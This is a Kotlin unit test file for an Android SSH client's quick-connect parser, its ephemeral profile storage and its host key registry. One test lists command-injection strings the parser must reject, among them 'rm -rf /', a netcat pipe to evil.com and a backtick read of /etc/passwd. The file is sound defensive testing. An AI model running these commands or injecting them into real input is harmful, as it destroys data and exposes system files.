package com.adamoutler.ssh.util

import android.content.Context
import com.adamoutler.ssh.crypto.SecurityStorageManager
import com.adamoutler.ssh.data.ConnectionProfile
import com.adamoutler.ssh.data.EphemeralProfileStore
import com.adamoutler.ssh.data.Protocol
import com.adamoutler.ssh.network.EphemeralHostKeyRegistry
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.annotation.Config
import java.security.KeyPairGenerator

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [34])
class QuickConnectSecurityTest {

    private lateinit var context: Context
    private lateinit var storageManager: SecurityStorageManager

    @Before
    fun setUp() {
        context = RuntimeEnvironment.getApplication()
        storageManager = SecurityStorageManager(context)
        EphemeralProfileStore.clear()
        EphemeralHostKeyRegistry.clear()
    }

    @Test
    fun testQuickConnectParserValidFormats() {
        // Standard hostname
        val res1 = QuickConnectParser.parse("myserver.lan")
        assertTrue(res1.isSuccess)
        val target1 = res1.getOrThrow()
        assertEquals("myserver.lan", target1.host)
        assertEquals(22, target1.port)
        assertEquals("", target1.username)
        assertEquals(Protocol.SSH, target1.protocol)

        // user@host:port
        val res2 = QuickConnectParser.parse("admin@prod.example.com:2222")
        assertTrue(res2.isSuccess)
        val target2 = res2.getOrThrow()
        assertEquals("prod.example.com", target2.host)
        assertEquals(2222, target2.port)
        assertEquals("admin", target2.username)
        assertEquals(Protocol.SSH, target2.protocol)

        // Telnet URI
        val res3 = QuickConnectParser.parse("telnet://cisco-router.local:2323")
        assertTrue(res3.isSuccess)
        val target3 = res3.getOrThrow()
        assertEquals("cisco-router.local", target3.host)
        assertEquals(2323, target3.port)
        assertEquals(Protocol.TELNET, target3.protocol)

        // SSH URI with user
        val res4 = QuickConnectParser.parse("ssh://deploy@gitlab.internal")
        assertTrue(res4.isSuccess)
        val target4 = res4.getOrThrow()
        assertEquals("gitlab.internal", target4.host)
        assertEquals(22, target4.port)
        assertEquals("deploy", target4.username)
        assertEquals(Protocol.SSH, target4.protocol)

        // IPv6 bracketed
        val res5 = QuickConnectParser.parse("root@[::1]:8022")
        assertTrue(res5.isSuccess)
        val target5 = res5.getOrThrow()
        assertEquals("::1", target5.host)
        assertEquals(8022, target5.port)
        assertEquals("root", target5.username)
    }

    @Test
    fun testQuickConnectParserInjectionRejection() {
        // Command injection vectors
        assertTrue(QuickConnectParser.parse("host; rm -rf /").isFailure)
        assertTrue(QuickConnectParser.parse("host & whoami").isFailure)
        assertTrue(QuickConnectParser.parse("host | nc evil.com 4444").isFailure)
        assertTrue(QuickConnectParser.parse("host`cat /etc/passwd`").isFailure)
        assertTrue(QuickConnectParser.parse("host\$(id)").isFailure)
        assertTrue(QuickConnectParser.parse("").isFailure)
        assertTrue(QuickConnectParser.parse("   ").isFailure)

        // Invalid ports
        assertTrue(QuickConnectParser.parse("host:0").isFailure)
        assertTrue(QuickConnectParser.parse("host:70000").isFailure)
        assertTrue(QuickConnectParser.parse("host:invalid").isFailure)
    }

    @Test
    fun testZeroPersistenceGuaranteeOnEphemeralProfile() {
        val ephemeralProfile = ConnectionProfile(
            id = "ephemeral_test_123",
            nickname = "Temporary Session",
            host = "temp.example.com",
            port = 22,
            isEphemeral = true,
            password = "sensitive_pass".toByteArray(Charsets.UTF_8),
        )

        // Attempting to persist an ephemeral profile MUST throw IllegalArgumentException
        try {
            storageManager.saveProfile(ephemeralProfile)
            fail("Should have thrown IllegalArgumentException when saving an ephemeral profile")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message?.contains("ephemeral", ignoreCase = true) == true)
        }

        // Store in EphemeralProfileStore
        EphemeralProfileStore.put(ephemeralProfile)

        // SecurityStorageManager.getProfile retrieves ephemeral profiles from memory
        val retrieved = storageManager.getProfile("ephemeral_test_123")
        assertNotNull(retrieved)
        assertEquals("temp.example.com", retrieved?.host)

        // Deleting profile wipes memory
        storageManager.deleteProfile("ephemeral_test_123")
        assertNull(storageManager.getProfile("ephemeral_test_123"))
        assertNull(EphemeralProfileStore.get("ephemeral_test_123"))
    }

    @Test
    fun testEphemeralHostKeyRegistry() {
        val kpg = KeyPairGenerator.getInstance("RSA")
        kpg.initialize(2048)
        val keyPair1 = kpg.generateKeyPair()
        val keyPair2 = kpg.generateKeyPair()

        val host = "adhoc-server.lan:22"

        assertFalse(EphemeralHostKeyRegistry.verify(host, keyPair1.public))

        EphemeralHostKeyRegistry.record(host, keyPair1.public)
        assertTrue(EphemeralHostKeyRegistry.verify(host, keyPair1.public))
        assertFalse(EphemeralHostKeyRegistry.verify(host, keyPair2.public))

        EphemeralHostKeyRegistry.clear()
        assertFalse(EphemeralHostKeyRegistry.verify(host, keyPair1.public))
    }
}
